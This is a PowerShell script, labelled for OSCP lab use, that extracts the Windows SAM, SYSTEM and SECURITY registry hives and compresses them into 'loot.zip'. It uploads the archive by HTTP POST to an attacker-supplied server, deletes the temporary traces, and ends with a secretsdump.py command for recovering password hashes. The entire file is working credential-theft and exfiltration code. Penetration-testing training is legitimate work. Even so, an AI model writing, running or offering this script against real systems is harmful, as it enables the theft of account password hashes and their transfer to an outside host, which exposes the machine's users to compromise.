# ============================================================
# SAM/SYSTEM/SECURITY extraction and exfiltration script
# For OSCP lab use only
# ============================================================

Write-Host "[*] Starting registry hives extraction..." -ForegroundColor Cyan

# ============================================================
# STEP 1: Extract registry hives
# ============================================================

Write-Host "[*] Extracting SAM..." -ForegroundColor Yellow
reg save HKLM\SAM C:\Windows\Temp\SAM /y
if ($LASTEXITCODE -eq 0) { Write-Host "[+] SAM extracted successfully" -ForegroundColor Green }
else { Write-Host "[-] Failed to extract SAM" -ForegroundColor Red; exit 1 }

Write-Host "[*] Extracting SYSTEM..." -ForegroundColor Yellow
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM /y
if ($LASTEXITCODE -eq 0) { Write-Host "[+] SYSTEM extracted successfully" -ForegroundColor Green }
else { Write-Host "[-] Failed to extract SYSTEM" -ForegroundColor Red; exit 1 }

Write-Host "[*] Extracting SECURITY..." -ForegroundColor Yellow
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY /y
if ($LASTEXITCODE -eq 0) { Write-Host "[+] SECURITY extracted successfully" -ForegroundColor Green }
else { Write-Host "[-] Failed to extract SECURITY" -ForegroundColor Red; exit 1 }

# ============================================================
# STEP 2: Compress into a ZIP archive
# ============================================================

$archivePath = "C:\Windows\Temp\loot.zip"
Write-Host "[*] Compressing files into $archivePath..." -ForegroundColor Yellow

# Delete archive if it already exists
if (Test-Path $archivePath) {
    Remove-Item $archivePath -Force
    Write-Host "[*] Existing archive deleted" -ForegroundColor Gray
}

Compress-Archive -Path @(
    "C:\Windows\Temp\SAM",
    "C:\Windows\Temp\SYSTEM",
    "C:\Windows\Temp\SECURITY"
) -DestinationPath $archivePath

if (Test-Path $archivePath) {
    $size = (Get-Item $archivePath).Length / 1KB
    Write-Host "[+] Archive created successfully ($([math]::Round($size, 2)) KB)" -ForegroundColor Green
} else {
    Write-Host "[-] Failed to create archive" -ForegroundColor Red
    exit 1
}

# ============================================================
# STEP 3: Remove temporary files
# ============================================================

Write-Host "[*] Removing temporary hives..." -ForegroundColor Yellow

Remove-Item "C:\Windows\Temp\SAM" -Force
Remove-Item "C:\Windows\Temp\SYSTEM" -Force
Remove-Item "C:\Windows\Temp\SECURITY" -Force

Write-Host "[+] Temporary files removed" -ForegroundColor Green

# ============================================================
# STEP 4: Prompt for server URL
# ============================================================

Write-Host ""
$serverUrl = Read-Host "[?] Enter server URL (e.g., http://10.10.14.5:8000/upload)"

if ([string]::IsNullOrWhiteSpace($serverUrl)) {
    Write-Host "[-] Invalid URL" -ForegroundColor Red
    exit 1
}

Write-Host "[*] Uploading to $serverUrl ..." -ForegroundColor Yellow

# ============================================================
# STEP 5: Send file via multipart POST
# ============================================================

try {
    # Read file as bytes
    $fileBytes = [System.IO.File]::ReadAllBytes($archivePath)
    $fileName  = [System.IO.Path]::GetFileName($archivePath)

    # Build multipart boundary
    $boundary  = [System.Guid]::NewGuid().ToString()
    $LF        = "`r`n"

    # Build multipart body manually
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        ""
    )

    $encoding    = [System.Text.Encoding]::UTF8
    $headerBytes = $encoding.GetBytes(($bodyLines -join $LF))
    $footerBytes = $encoding.GetBytes("$LF--$boundary--$LF")

    # Assemble header + file + footer
    $bodyBytes = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
    [System.Buffer]::BlockCopy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
    [System.Buffer]::BlockCopy($fileBytes,   0, $bodyBytes, $headerBytes.Length, $fileBytes.Length)
    [System.Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $fileBytes.Length, $footerBytes.Length)

    # Send request
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
    $response = $webClient.UploadData($serverUrl, "POST", $bodyBytes)

    $responseText = [System.Text.Encoding]::UTF8.GetString($response)
    Write-Host "[+] File uploaded successfully!" -ForegroundColor Green
    Write-Host "[+] Server response: $responseText" -ForegroundColor Gray

} catch {
    Write-Host "[-] Upload error: $_" -ForegroundColor Red
    exit 1
}

# ============================================================
# STEP 6: Final cleanup
# ============================================================

Write-Host ""
$cleanup = Read-Host "[?] Delete local archive? (y/n)"
if ($cleanup -eq "y") {
    Remove-Item $archivePath -Force
    Write-Host "[+] Local archive deleted" -ForegroundColor Green
}

Write-Host ""
Write-Host "[+] Done! Extract hashes with:" -ForegroundColor Cyan
Write-Host "    secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL" -ForegroundColor White
